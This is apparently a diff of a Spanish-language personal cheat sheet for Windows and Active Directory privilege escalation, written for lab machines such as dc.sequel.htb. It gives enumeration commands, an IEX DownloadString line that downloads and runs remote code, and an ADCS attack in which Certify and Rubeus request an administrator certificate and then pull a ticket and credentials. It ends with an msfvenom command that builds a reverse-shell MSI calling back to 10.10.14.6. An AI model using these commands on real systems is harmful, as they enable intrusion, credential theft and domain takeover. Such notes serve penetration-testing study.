@@ -2,20 +2,67 @@
 https://lolbas-project.github.io/#
 #Binarios windows
 
-### Comandos de busqueda
+----------      ----------      ----------      ----------
+	### Comandos de busqueda
 net user <user>
 #Nos muestra la informacion de nuestro usuario: nombre, grupo, etc
+#Net user sin especificar usario para ver todos los usuarios
 net localgroup <nombbre local group>
 #Nos muetra info del grupo, comentario, etc
 whoami /priv
 #Permite lista los privilegios
 whoami /all
 #Muestra toda la info dde nuestro perfil de usr
+
+----------      ----------      ----------      ----------
+	###Lugares a revisar
+##winpeas.ps1
+https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS
+#Escanea el sistema en busqueda de posibles vulnerabilidades
+
 tasklist
 #Procesos corriendo en el sistema
-
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+#Buscar historial de consola ps
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 #Enumerar registros de Windows
+C:\SQLServer\logs
+#En esta ruta o similares puede haber logs de errores de coneccion a la base de datos en caso de usarse
+
+----------      ----------      ----------      ----------
+	### Grupos de interes
+## LAPS_reader
+https://github.com/kfosaaen/Get-LAPSPasswords/tree/master
+#Es un grupo que si un usuario pertenece va a poder ver las contraseñas. Para ello clonamos el repo y ejecutamos el .ps1 en la maquina windows
+IEX(New-Object Net.WebClient).DownloadString('https://url')
+#De esta forma descargamos y ejecutamos de una lo que compartimos mediante un sv
+
+## Remote management user
+Permite la coneccion al usuario con usr y pswd sin necesiadad de certificados o keys.
+Para ver forrmas de coneccion mediante evil-winrm visitar attacking_winrm.txt
+
+----------      ----------      ----------      ----------
+	### ADCS
+https://github.com/GhostPack/Certify
+#Para ver como saber si ADCS esta en uso ver attacking_ldap.txt
+upload Certify.exe
+#Subir .exe mediante winrm a la maquina windows
+.\Certify.exe find /vulnerable /currentuser
+#Usar con y sin la flag currentuser
+#En el README esta "three following issues" con ejemplos y explicacion de los problemas de permisos en certificados
+#Se busca por: ManageCA, PEND_ALL_REQUESTS y ENROLLEE_SUPPLIES_SUBJECT
+
+.\Certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:administrator
+#Ejemplo de atacando el escenario 3
+#Devuelve un certificado que debemos copiar y usar con openssl
+openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+#pwd blank si pregunta por una
+#El certificado de output se sube a la maquina
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx
+#Se realiza request para obtener el TGT como administrator
+.\Rubeus.exe asktgt /user:administrator /certificate:C:\programdata\cert.pfx /getcredentials /show /nowrap
+#En el caso de que Rubeus no nos genere una sesion como administrator voy a soliciar la credencial con la flag /getcredentials
+
 
 msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -f msi -o rev.msi
 #Creo una reverse .msi
